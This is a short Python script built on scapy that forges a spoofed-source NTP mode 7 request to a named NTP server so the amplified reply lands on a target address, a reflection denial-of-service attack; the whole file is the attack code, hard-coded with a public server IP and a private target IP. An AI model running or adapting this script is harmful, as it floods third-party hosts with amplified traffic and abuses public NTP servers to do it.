from scapy.all import *

def ntp_amplification(ntp_address, target_address):
    ip_info = IP(
        src = target_address,
        dst = ntp_address
    )
    udp_info = UDP(
        dport = 123,
        sport = RandShort()
    )
    ntp_info = NTP(
        version=2,
        mode=7,
    )
    ntp_info.extension = b'\x00\x01\x00\x00'
    ans = sr1(ip_info/udp_info/ntp_info)
    print(ans.show())


if __name__ == "__main__":
    ntp_amplification("79.133.44.137", "192.168.11.231")